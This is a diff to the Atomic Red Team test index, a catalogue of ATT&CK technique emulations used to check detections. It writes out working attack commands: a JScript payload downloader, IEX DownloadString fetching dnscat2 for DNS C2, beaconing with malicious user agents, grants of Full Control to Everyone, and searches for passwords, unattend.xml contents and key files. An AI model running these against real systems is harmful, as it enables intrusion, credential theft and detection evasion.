@@ -7662,138 +7662,82 @@ defense-evasion:
       identifier: T1222
     atomic_tests:
     - name: Take ownership using takeown utility
-      description: 'Modifies the filesystem permissions of the specified file or folder
-        to take ownership of the object.
-
-'
+      description: |
+        Modifies the filesystem permissions of the specified file or folder to take ownership of the object. Upon execution, "SUCCESS" will
+        be displayed for the folder and each file inside of it.
       supported_platforms:
       - windows
       input_arguments:
         file_folder_to_own:
           description: Path of the file or folder for takeown to take ownership.
           type: path
-          default: PathToAtomicsFolder\T1222\T1222.yaml
+          default: "%temp%\\T1222_takeown_folder"
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: Test requrires a file to take ownership of to be located at (#{file_folder_to_own})
+        prereq_command: 'IF EXIST #{file_folder_to_own} ( EXIT 0 ) ELSE ( EXIT 1 )'
+        get_prereq_command: |-
+          mkdir #{file_folder_to_own}
+          echo T1222_takeown1 >> #{file_folder_to_own}\T1222_takeown1.txt
+          echo T1222_takeown2 >> #{file_folder_to_own}\T1222_takeown2.txt
       executor:
         name: command_prompt
-        command: 'takeown.exe /f #{file_folder_to_own}
-
-'
-    - name: Take ownership recursively using takeown utility
-      description: 'Modifies the filesystem permissions of the specified folder to
-        take ownership of it and its contents.
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        folder_to_own:
-          description: Path of the folder for takeown to take ownership.
-          type: path
-          default: PathToAtomicsFolder\T1222
-      executor:
-        name: command_prompt
-        command: 'takeown.exe /f #{folder_to_own} /r
-
-'
-    - name: cacls - Grant permission to specified user or group
-      description: 'Modifies the filesystem permissions of the specified file or folder
-        to allow the specified user or group Full Control.
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        file_or_folder:
-          description: Path of the file or folder to change permissions.
-          type: path
-          default: PathToAtomicsFolder\T1222\T1222.yaml
-        user_or_group:
-          description: User or group to allow full control
-          type: string
-          default: Everyone
-      executor:
-        name: command_prompt
-        command: 'cacls.exe #{file_or_folder} /grant #{user_or_group}:F
+        command: 'takeown.exe /f #{file_folder_to_own} /r
 
 '
     - name: cacls - Grant permission to specified user or group recursively
-      description: 'Modifies the filesystem permissions of the specified folder and
-        contents to allow the specified user or group Full Control.
-
-'
+      description: |
+        Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control. If "Access is denied"
+        is displayed it may be because the file or folder doesn't exit. Run the prereq command to create it. Upon successfull execution, "Successfully processed 3 files"
+        will be displayed.
       supported_platforms:
       - windows
       input_arguments:
         file_or_folder:
           description: Path of the file or folder to change permissions.
           type: path
-          default: PathToAtomicsFolder\T1222
+          default: "%temp%\\T1222_cacls"
         user_or_group:
           description: User or group to allow full control
           type: string
           default: Everyone
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: Test requrires a file to modifyto be located at (#{file_or_folder})
+        prereq_command: 'IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )'
+        get_prereq_command: |-
+          mkdir #{file_or_folder}
+          echo T1222_cacls1 >> #{file_or_folder}\T1222_cacls1.txt
+          echo T1222_cacls2 >> #{file_or_folder}\T1222_cacls2.txt
       executor:
         name: command_prompt
-        command: 'cacls.exe #{file_or_folder} /grant #{user_or_group}:F /t
-
-'
-    - name: icacls - Grant permission to specified user or group
-      description: 'Modifies the filesystem permissions of the specified file or folder
-        to allow the specified user or group Full Control.
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        file_or_folder:
-          description: Path of the file or folder to change permissions.
-          type: path
-          default: PathToAtomicsFolder\T1222\T1222.yaml
-        user_or_group:
-          description: User or group to allow full control
-          type: string
-          default: Everyone
-      executor:
-        name: command_prompt
-        command: 'icacls.exe #{file_or_folder} /grant #{user_or_group}:F
-
-'
-    - name: icacls - Grant permission to specified user or group recursively
-      description: 'Modifies the filesystem permissions of the specified folder and
-        contents to allow the specified user or group Full Control.
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        file_or_folder:
-          description: Path of the file or folder to change permissions.
-          type: path
-          default: PathToAtomicsFolder\T1222
-        user_or_group:
-          description: User or group to allow full control
-          type: string
-          default: Everyone
-      executor:
-        name: command_prompt
-        command: 'icacls.exe #{file_or_folder} /grant #{user_or_group}:F /t
+        command: 'Icacls.exe #{file_or_folder} /grant #{user_or_group}:F
 
 '
     - name: attrib - Remove read-only attribute
-      description: 'Removes the read-only attribute from a file or folder using the
-        attrib.exe command.
-
-'
+      description: |
+        Removes the read-only attribute from a file or folder using the attrib.exe command. Upon execution, no output will be displayed.
+        Open the file in File Explorer > Right Click - Prperties and observe that the Read Only checkbox is empty.
       supported_platforms:
       - windows
       input_arguments:
         file_or_folder:
           description: Path of the file or folder remove attribute.
           type: path
-          default: PathToAtomicsFolder\T1222
+          default: "%temp%\\T1222_attrib"
+      dependency_executor_name: command_prompt
+      dependencies:
+      - description: Test requrires a file to modify to be located at (#{file_or_folder})
+        prereq_command: 'IF EXIST #{file_or_folder} ( EXIT 0 ) ELSE ( EXIT 1 )'
+        get_prereq_command: |-
+          mkdir #{file_or_folder}
+          echo T1222_attrib1 >> #{file_or_folder}\T1222_attrib1.txt
+          echo T1222_attrib2 >> #{file_or_folder}\T1222_attrib2.txt
+          attrib.exe +r #{file_or_folder}\T1222_attrib1.txt
+          attrib.exe +r #{file_or_folder}\T1222_attrib2.txt
       executor:
         name: command_prompt
-        command: 'attrib.exe -r #{file_or_folder}
+        command: 'attrib.exe -r #{file_or_folder}\*.* /s
 
 '
     - name: chmod - Change file or folder mode (numeric mode)
@@ -9143,10 +9087,9 @@ defense-evasion:
       identifier: T1118
     atomic_tests:
     - name: CheckIfInstallable method call
-      description: 'Executes the CheckIfInstallable class constructor runner instead
-        of executing InstallUtil.
-
-'
+      description: |
+        Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.
+        If no output is displayed the test executed successfuly.
       supported_platforms:
       - windows
       input_arguments:
@@ -9208,10 +9151,9 @@ defense-evasion:
           $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
           Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
     - name: InstallHelper method call
-      description: 'Executes the InstallHelper class constructor runner instead of
-        executing InstallUtil.
-
-'
+      description: |
+        Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test
+        executed successfuly.
       supported_platforms:
       - windows
       input_arguments:
@@ -9275,7 +9217,8 @@ defense-evasion:
           $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
           Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
     - name: InstallUtil class constructor method call
-      description: 'Executes the installer assembly class constructor.
+      description: 'Executes the installer assembly class constructor. Upon execution,
+        version information will be displayed the .NET framework install utility.
 
 '
       supported_platforms:
@@ -9341,7 +9284,8 @@ defense-evasion:
           $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
           Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
     - name: InstallUtil Install method call
-      description: 'Executes the Install Method
+      description: 'Executes the Install Method. Upon execution, version information
+        will be displayed the .NET framework install utility.
 
 '
       supported_platforms:
@@ -9407,7 +9351,8 @@ defense-evasion:
           $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
           Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
     - name: InstallUtil Uninstall method call - /U variant
-      description: 'Executes the Uninstall Method
+      description: 'Executes the Uninstall Method. Upon execution, version information
+        will be displayed the .NET framework install utility.
 
 '
       supported_platforms:
@@ -9474,7 +9419,8 @@ defense-evasion:
           Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
     - name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall'
         variant
-      description: 'Executes the Uninstall Method
+      description: 'Executes the Uninstall Method. Upon execution, version information
+        will be displayed the .NET framework install utility.
 
 '
       supported_platforms:
@@ -9540,7 +9486,8 @@ defense-evasion:
           $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
           Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
     - name: InstallUtil HelpText method call
-      description: 'Executes the Uninstall Method
+      description: 'Executes the Uninstall Method. Upon execution, help information
+        will be displayed for InstallUtil.
 
 '
       supported_platforms:
@@ -9606,10 +9553,9 @@ defense-evasion:
           $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
           Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
     - name: InstallUtil evasive invocation
-      description: 'Executes an InstallUtil assembly by renaming InstallUtil.exe and
-        using a nonstandard extension for the assembly.
-
-'
+      description: |
+        Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, "Running a transacted installation."
+        will be displayed, along with other information about the opperation. "The transacted install has completed." will be displayed upon completion.
       supported_platforms:
       - windows
       input_arguments:
@@ -12399,6 +12345,141 @@ defense-evasion:
           set comspec=#{command_to_execute}
           cscript manage-bde.wsf
         cleanup_command: 'set comspec=C:\Windows\System32\cmd.exe
+
+'
+  T1045:
+    technique:
+      x_mitre_data_sources:
+      - Binary file metadata
+      name: Software Packing
+      description: |-
+        Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.
+
+        Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.
+
+        Adversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018)
+      id: attack-pattern--6ff403bc-93e3-48be-8687-e102fdba8c88
+      modified: '2019-09-26T15:56:47.231Z'
+      x_mitre_platforms:
+      - Windows
+      - macOS
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.1'
+      type: attack-pattern
+      x_mitre_detection: Use file scanning to look for known software packers or artifacts
+        of packing techniques. Packing is not a definitive indicator of malicious
+        activity, because legitimate software may use packing techniques to reduce
+        binary size or to protect proprietary code.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - Filip Kafka, ESET
+      created: '2017-05-31T21:30:43.472Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      external_references:
+      - external_id: T1045
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1045
+      - source_name: capec
+        external_id: CAPEC-570
+        url: https://capec.mitre.org/data/definitions/570.html
+      - source_name: Wikipedia Exe Compression
+        description: Executable compression. (n.d.). Retrieved December 4, 2014.
+        url: http://en.wikipedia.org/wiki/Executable_compression
+      - description: Kafka, F. (2018, January). ESET's Guide to Deobfuscating and
+          Devirtualizing FinFisher. Retrieved August 12, 2019.
+        source_name: ESET FinFisher Jan 2018
+        url: https://www.welivesecurity.com/wp-content/uploads/2018/01/WP-FinFisher.pdf
+      x_mitre_defense_bypassed:
+      - Signature-based detection
+      - Anti-virus
+      - Heuristic detection
+      identifier: T1045
+    atomic_tests:
+    - name: Binary simply packed by UPX (linux)
+      description: |
+        Copies and then runs a simple binary (just outputting "the cake is a lie"), that was packed by UPX.
+        No other protection/compression were applied.
+      supported_platforms:
+      - linux
+      input_arguments:
+        bin_path:
+          description: Packed binary
+          type: Path
+          default: PathToAtomicsFolder/T1045/bin/linux/test_upx
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
+
+'
+        cleanup_command: 'rm /tmp/packed_bin
+
+'
+    - name: Binary packed by UPX, with modified headers (linux)
+      description: |
+        Copies and then runs a simple binary (just outputting "the cake is a lie"), that was packed by UPX.
+
+        The UPX magic number (`0x55505821`, "`UPX!`") was changed to (`0x4c4f5452`, "`LOTR`"). This prevents the binary from being detected
+        by some methods, and especially UPX is not able to uncompress it any more.
+      supported_platforms:
+      - linux
+      input_arguments:
+        bin_path:
+          description: Packed binary
+          type: Path
+          default: PathToAtomicsFolder/T1045/bin/linux/test_upx_header_changed
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
+
+'
+        cleanup_command: 'rm /tmp/packed_bin
+
+'
+    - name: Binary simply packed by UPX
+      description: |
+        Copies and then runs a simple binary (just outputting "the cake is a lie"), that was packed by UPX.
+        No other protection/compression were applied.
+      supported_platforms:
+      - macos
+      input_arguments:
+        bin_path:
+          description: Packed binary
+          type: Path
+          default: PathToAtomicsFolder/T1045/bin/darwin/test_upx
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
+
+'
+        cleanup_command: 'rm /tmp/packed_bin
+
+'
+    - name: Binary packed by UPX, with modified headers
+      description: |
+        Copies and then runs a simple binary (just outputting "the cake is a lie"), that was packed by UPX.
+
+        The UPX magic number (`0x55505821`, "`UPX!`") was changed to (`0x4c4f5452`, "`LOTR`"). This prevents the binary from being detected
+        by some methods, and especially UPX is not able to uncompress it any more.
+      supported_platforms:
+      - macos
+      input_arguments:
+        bin_path:
+          description: Packed binary
+          type: Path
+          default: PathToAtomicsFolder/T1045/bin/darwin/test_upx_header_changed
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
+
+'
+        cleanup_command: 'rm /tmp/packed_bin
 
 '
   T1151:
@@ -18839,7 +18920,8 @@ discovery:
       identifier: T1082
     atomic_tests:
     - name: System Information Discovery
-      description: 'Identify System Info
+      description: 'Identify System Info. Upon execution, system info and time info
+        will be displayed.
 
 '
       supported_platforms:
@@ -18912,7 +18994,8 @@ discovery:
           sudo lsmod | grep -i "virtio_pci\|virtio_net"
           sudo lsmod | grep -i "hv_vmbus\|hv_blkvsc\|hv_netvsc\|hv_utils\|hv_storvsc"
     - name: Hostname Discovery (Windows)
-      description: 'Identify system hostname for Windows.
+      description: 'Identify system hostname for Windows. Upon execution, the hostname
+        of the device will be displayed.
 
 '
       supported_platforms:
@@ -18937,7 +19020,8 @@ discovery:
 
 '
     - name: Windows MachineGUID Discovery
-      description: 'Identify the Windows MachineGUID value for a system.
+      description: 'Identify the Windows MachineGUID value for a system. Upon execution,
+        the machine GUID will be displayed from registry.
 
 '
       supported_platforms:
@@ -20656,7 +20740,8 @@ credential-access:
 
 '
     - name: Extracting passwords with findstr
-      description: 'Extracting Credentials from Files
+      description: 'Extracting Credentials from Files. Upon execution, the contents
+        of files that contain the word "password" will be displayed.
 
 '
       supported_platforms:
@@ -20668,18 +20753,17 @@ credential-access:
           findstr /si pass *.xml *.doc *.txt *.xls
           ls -R | select-string -Pattern password
     - name: Access unattend.xml
-      description: 'Attempts to access unattend.xml, where credentials are commonly
-        stored, within the Panther directory where installation logs are stored.
-
-'
+      description: |
+        Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.
+        If these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         elevation_required: true
         command: |
-          type C:\Windows\Panther\unattend.xml > nul 2>&1
-          type C:\Windows\Panther\Unattend\unattend.xml > nul 2>&1
+          type C:\Windows\Panther\unattend.xml
+          type C:\Windows\Panther\Unattend\unattend.xml
   T1214:
     technique:
       x_mitre_permissions_required:
@@ -21069,7 +21153,7 @@ credential-access:
 '
     - name: PowerShell - Prompt User for Password
       description: |
-        Prompt User for Password (Local Phishing) as seen in Stitch RAT.
+        Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.
 
         Reference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py
       supported_platforms:
@@ -21505,10 +21589,7 @@ credential-access:
       executor:
         name: command_prompt
         elevation_required: true
-        command: |
-          echo "ATOMICREDTEAM" > %windir%\cert.key
-          dir c:\ /b /s .key | findstr /e .key
-        cleanup_command: 'del c:\Windows\cert.key >nul 2>&1
+        command: 'dir c:\ /b /s .key | findstr /e .key
 
 '
     - name: Discover Private SSH Keys
@@ -22245,10 +22326,9 @@ execution:
       identifier: T1118
     atomic_tests:
     - name: CheckIfInstallable method call
-      description: 'Executes the CheckIfInstallable class constructor runner instead
-        of executing InstallUtil.
-
-'
+      description: |
+        Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.
+        If no output is displayed the test executed successfuly.
       supported_platforms:
       - windows
       input_arguments:
@@ -22310,10 +22390,9 @@ execution:
           $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
           Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
     - name: InstallHelper method call
-      description: 'Executes the InstallHelper class constructor runner instead of
-        executing InstallUtil.
-
-'
+      description: |
+        Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test
+        executed successfuly.
       supported_platforms:
       - windows
       input_arguments:
@@ -22377,7 +22456,8 @@ execution:
           $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
           Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
     - name: InstallUtil class constructor method call
-      description: 'Executes the installer assembly class constructor.
+      description: 'Executes the installer assembly class constructor. Upon execution,
+        version information will be displayed the .NET framework install utility.
 
 '
       supported_platforms:
@@ -22443,7 +22523,8 @@ execution:
           $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
           Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
     - name: InstallUtil Install method call
-      description: 'Executes the Install Method
+      description: 'Executes the Install Method. Upon execution, version information
+        will be displayed the .NET framework install utility.
 
 '
       supported_platforms:
@@ -22509,7 +22590,8 @@ execution:
           $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
           Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
     - name: InstallUtil Uninstall method call - /U variant
-      description: 'Executes the Uninstall Method
+      description: 'Executes the Uninstall Method. Upon execution, version information
+        will be displayed the .NET framework install utility.
 
 '
       supported_platforms:
@@ -22576,7 +22658,8 @@ execution:
           Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
     - name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall'
         variant
-      description: 'Executes the Uninstall Method
+      description: 'Executes the Uninstall Method. Upon execution, version information
+        will be displayed the .NET framework install utility.
 
 '
       supported_platforms:
@@ -22642,7 +22725,8 @@ execution:
           $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
           Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
     - name: InstallUtil HelpText method call
-      description: 'Executes the Uninstall Method
+      description: 'Executes the Uninstall Method. Upon execution, help information
+        will be displayed for InstallUtil.
 
 '
       supported_platforms:
@@ -22708,10 +22792,9 @@ execution:
           $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
           Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
     - name: InstallUtil evasive invocation
-      description: 'Executes an InstallUtil assembly by renaming InstallUtil.exe and
-        using a nonstandard extension for the assembly.
-
-'
+      description: |
+        Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, "Running a transacted installation."
+        will be displayed, along with other information about the opperation. "The transacted install has completed." will be displayed upon completion.
       supported_platforms:
       - windows
       input_arguments:
@@ -25187,12 +25270,13 @@ execution:
       identifier: T1204
     atomic_tests:
     - name: OSTap Style Macro Execution
-      description: "This Test uses a VBA macro to create and execute #{jse_path} with
-        cscript.exe. The .jse file in turn launches wscript.exe.\nExecution is handled
-        by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1)
-        to load and execute VBA code into Excel or Word documents.\n\nThis is a known
-        execution chain observed by the OSTap downloader commonly used in TrickBot
-        campaigns \nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n"
+      description: |
+        This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. The .jse file in turn launches wscript.exe.
+        Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+
+        This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns
+        References:
+          https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader
       supported_platforms:
       - windows
       input_arguments:
@@ -25229,6 +25313,30 @@ execution:
         cleanup_command: |
           if (Test-Path #{jse_path}) { Remove-Item #{jse_path} }
           Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+    - name: OSTap Payload Download
+      description: 'Uses cscript //E:jscript to download a file
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        script_file:
+          description: File to execute jscript code from
+          type: Path
+          default: "%TEMP%\\OSTapGet.js"
+        file_url:
+          description: URL to retrieve file from
+          type: Url
+          default: https://128.30.52.100/TR/PNG/iso_8859-1.txt
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: |
+          echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
+          cscript //E:Jscript #{script_file}
+        cleanup_command: 'del #{script_file} /F /Q >nul 2>&1
+
+'
     - name: Maldoc choice flags command execution
       description: |
         This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders
@@ -25265,9 +25373,9 @@ execution:
 
 '
     - name: OSTAP JS version
-      description: "Malicious JavaScript executing CMD which spaws wscript.exe //e:jscript
-        \nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1)
-        to load and execute VBA code into Excel or Word documents.\n"
+      description: |
+        Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
+        Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
       supported_platforms:
       - windows
       input_arguments:
@@ -27422,7 +27530,7 @@ collection:
         elevation_required: false
         command: |
           echo Get-Process | clip
-          iex Get-Clipboard
+          Get-Clipboard | iex
   T1074:
     technique:
       x_mitre_data_sources:
@@ -29290,9 +29398,10 @@ command-and-control:
       identifier: T1071
     atomic_tests:
     - name: Malicious User Agents - Powershell
-      description: |
-        This test simulates an infected host beaconing to command and control.
-        Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
+      description: "This test simulates an infected host beaconing to command and
+        control. Upon execution, no output will be displayed. \nUse an application
+        such as Wireshark to record the session and observe user agent strings and
+        responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -29309,9 +29418,10 @@ command-and-control:
           Invoke-WebRequest #{domain} -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
           Invoke-WebRequest #{domain} -UserAgent "*<|>*" | out-null
     - name: Malicious User Agents - CMD
-      description: |
-        This test simulates an infected host beaconing to command and control.
-        Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
+      description: "This test simulates an infected host beaconing to command and
+        control. Upon execution, no out put will be displayed. \nUse an application
+        such as Wireshark to record the session and observe user agent strings and
+        responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n"
       supported_platforms:
       - windows
       input_arguments:
@@ -29322,10 +29432,10 @@ command-and-control:
       executor:
         name: command_prompt
         command: |
-          curl -s -A "HttpBrowser/1.0" -m3 #{domain}
-          curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
-          curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
-          curl -s -A "*<|>*" -m3 #{domain}
+          curl -s -A "HttpBrowser/1.0" -m3 #{domain} >nul 2>&1
+          curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain} >nul 2>&1
+          curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain} >nul 2>&1
+          curl -s -A "*<|>*" -m3 #{domain} >nul 2>&1
     - name: Malicious User Agents - Nix
       description: |
         This test simulates an infected host beaconing to command and control.
@@ -29349,6 +29459,7 @@ command-and-control:
       description: |
         This test simulates an infected host sending a large volume of DNS queries to a command and control server.
         The intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.
+        A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.
       supported_platforms:
       - windows
       input_arguments:
@@ -29380,6 +29491,7 @@ command-and-control:
       description: |
         This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.
         This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
+        A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.
       supported_platforms:
       - windows
       input_arguments:
@@ -29412,12 +29524,13 @@ command-and-control:
         name: powershell
         elevation_required: false
         command: |
-          Set-Location $PathToAtomicsFolder
+          Set-Location PathToAtomicsFolder
           .\T1071\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
     - name: DNS Long Domain Query
       description: |
         This test simulates an infected host returning data to a command and control server using long domain names.
         The simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.
+         Upon execution, DNS information about the domain will be displayed for each callout.
       supported_platforms:
       - windows
       input_arguments:
@@ -29438,13 +29551,15 @@ command-and-control:
         name: powershell
         elevation_required: false
         command: |
-          Set-Location $PathToAtomicsFolder
+          Set-Location PathToAtomicsFolder
           .\T1071\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
     - name: DNS C2
       description: |
         This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.
         The following blogs have more information.
+
         https://github.com/iagox86/dnscat2
+
         https://github.com/lukebaggett/dnscat2-powershell
       supported_platforms:
       - windows
@@ -29464,30 +29579,6 @@ command-and-control:
         command: |
           IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
           Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
-    - name: OSTap Payload Download
-      description: 'Uses cscript //E:jscript to download a file
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        script_file:
-          description: File to execute jscript code from
-          type: Path
-          default: "%TEMP%\\OSTapGet.js"
-        file_url:
-          description: URL to retrieve file from
-          type: Url
-          default: https://128.30.52.100/TR/PNG/iso_8859-1.txt
-      executor:
-        name: command_prompt
-        elevation_required: false
-        command: |
-          echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
-          cscript //E:Jscript #{script_file}
-        cleanup_command: 'del #{script_file} /F /Q >nul 2>&1
-
-'
   T1032:
     technique:
       x_mitre_data_sources:
@@ -29682,7 +29773,7 @@ command-and-control:
           description: The folder path of ncat.exe
           type: path
           default: "$env:TEMP\\T1095"
-      dependency_executor_name: powerShell
+      dependency_executor_name: powershell
       dependencies:
       - description: ncat.exe must be available at specified location (#{ncat_exe})
         prereq_command: if( Test-Path "#{ncat_exe}") {exit 0} else {exit 1}
